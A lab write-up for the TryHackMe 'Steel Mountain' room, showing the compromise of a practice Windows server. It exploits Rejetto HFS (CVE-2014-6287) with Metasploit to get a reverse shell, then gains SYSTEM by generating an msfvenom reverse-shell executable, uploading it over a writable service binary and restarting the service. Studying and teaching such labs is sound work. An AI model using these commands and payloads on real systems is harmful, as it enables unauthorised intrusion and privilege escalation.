# Steel Mountain

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows 
privilege escalation enumeration and learn a new technique to get Administrator access.
```

Room link: [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

## Solution

### Task 1: Introduction

<img src="Images/Mr_Robot.png" alt="Mr Robot" style="width:200px;"/>

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our [Kali Room](https://tryhackme.com/room/kali).

Please note that this machine does not respond to ping (ICMP) and may take a **few minutes to boot up**.

---------------------------------------------------------------------------

#### Who is the employee of the month?

Hint: Reverse image search

We start by scanning for services

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ export TARGET_IP=10.114.129.223

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ sudo nmap -sC -sV $TARGET_IP   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 15:39 +0100
Nmap scan report for 10.114.129.223
Host is up (0.024s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2026-02-27T14:36:23
|_Not valid after:  2026-08-29T14:36:23
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2026-02-28T14:40:09+00:00
|_ssl-date: 2026-02-28T14:40:13+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 0a:f2:f1:53:53:0d (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-28T14:40:08
|_  start_date: 2026-02-28T14:35:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.23 seconds
```

Next, we check out the contents of the web server by browsing to `http://10.114.129.223/`

![Web Page at SteelMountain](Images/Web_Page_at_SteelMountain.png)

Checking the source code, we find

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

Note the name of the image.

Answer: `Bill Harper`

---------------------------------------------------------------------------

### Task 2: Initial Access

Now you have deployed the machine, lets get an initial shell!

---------------------------------------------------------------------------

#### Scan the machine with nmap. What is the other port running a web server on?

See nmap output above.

Answer: `8080`

#### Take a look at the other web server. What file server is running?

Browsing to `http://10.114.129.223:8080/` we see

![Web Page at SteelMountain 2](Images/Web_Page_at_SteelMountain_2.png)

Hoover over the link to find its destination (`http://www.rejetto.com/hfs/`)

Answer: `Rejetto HTTP File Server`

#### What is the CVE number to exploit this file server?

Hint: `https://www.exploit-db.com/`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ searchsploit Rejetto HTTP File Server 2.3
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                          | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                  | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                             | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                             | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                        | windows/webapps/34852.txt
Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE)                                                                                                     | typescript/webapps/52102.py
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                     | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/39161.py

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ head -n 20 39161.py     
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#              It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#              It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux.

#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#          You may need to run it multiple times for success!
```

Answer: `2014-6287`

#### Use Metasploit to get an initial shell. What is the user flag?

Hint: C:\Users\bill\Desktop

Get a meterpreter session with Metasploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ msfconsole -q                      
msf > search rejetto

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
   1  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec

msf > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.114.129.223
RHOSTS => 10.114.129.223
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
LHOST => tun0
msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS     10.114.129.223   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/http/rejetto_hfs_exec) > exploit
[*] Started reverse TCP handler on 192.168.146.103:4444 
[*] Using URL: http://192.168.146.103:8080/W9Y4DocjGqxfWYV
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /W9Y4DocjGqxfWYV
[*] Sending stage (177734 bytes) to 10.114.129.223
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[!] Tried to delete %TEMP%\LmRQSkmYdlL.vbs, unknown result
[*] Meterpreter session 1 opened (192.168.146.103:4444 -> 10.114.129.223:49241) at 2026-02-28 16:07:00 +0100
[*] Server stopped.

meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

Then we get the user flag

```bash
meterpreter > shell
Process 2988 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd ..
cd ..

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs>cd ..
cd ..

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu>cd ..
cd ..

C:\Users\bill\AppData\Roaming\Microsoft\Windows>cd ..
cd ..

C:\Users\bill\AppData\Roaming\Microsoft>cd ..
cd ..

C:\Users\bill\AppData\Roaming>cd ..
cd ..

C:\Users\bill\AppData>cd ..
cd ..

C:\Users\bill>cd Desktop
cd Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  08:08 AM    <DIR>          .
09/27/2019  08:08 AM    <DIR>          ..
09/27/2019  04:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,156,055,552 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b<REDACTED>5

C:\Users\bill\Desktop>
```

Answer: `b<REDACTED>5`

---------------------------------------------------------------------------

### Task 3: Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called **PowerUp**, that's purpose is to evaluate a Windows machine and determine any abnormalities - "*PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.*"

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1). If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.

![Upload PowerUp](Images/Upload_PowerUp.png)

To execute this using Meterpreter, I will type `load powershell` into meterpreter. Then I will enter powershell by entering `powershell_shell`:

![Execute PowerUp](Images/Execute_PowerUp.png)

Transfer the script to the target machine

```bash
meterpreter > lpwd
/mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain
meterpreter > cd C:\\Users\\bill\\Downloads
meterpreter > pwd
C:\Users\bill\Downloads
meterpreter > upload PowerUp.ps1
[*] Uploading  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/PowerUp.ps1 -> PowerUp.ps1
meterpreter > 
```

Load Powershell and execute the script

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > pwd

Path
----
C:\Users\bill\Downloads


PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files



PS > 
```

---------------------------------------------------------------------------

Take close attention to the CanRestart option that is set to true.

#### What is the name of the service which shows up as an unquoted service path vulnerability?

```text
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

Answer: `AdvancedSystemCareService9`

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.146.103 LPORT=12345 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
```

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

Upload the binary

```bash
meterpreter > upload Advanced.exe 'C:/Program Files (x86)/IObit/Advanced.exe'
[*] Uploading  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/Advanced.exe -> C:/Program Files (x86)/IObit/Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/Advanced.exe -> C:/Program Files (x86)/IObit/Advanced.exe
[*] Completed  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Steel_Mountain/Advanced.exe -> C:/Program Files (x86)/IObit/Advanced.exe
meterpreter > 
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ nc -lvnp 12345                    
listening on [any] 12345 ...

```

Restart the service

```bat
meterpreter > shell
Process 2216 created.
Channel 6 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\Downloads>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Downloads>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\bill\Downloads>
```

**Note**: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

#### What is the root flag?

Hint: To restart a service in Windows use the following command: `sc start <service path name from question 2>`

Back at our netcat listener, we now have a connection and can get the root flag

```bat
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Steel_Mountain]
└─$ nc -lvnp 12345                    
listening on [any] 12345 ...
connect to [192.168.146.103] from (UNKNOWN) [10.114.129.223] 49280
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>where /R C:\ root.txt
where /R C:\ root.txt
C:\Users\Administrator\Desktop\root.txt

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
9<REDACTED>0
C:\Windows\system32>
```

Answer: `9<REDACTED>0`

---------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [PowerUp - GitHub](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Sc - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11))
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [where - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
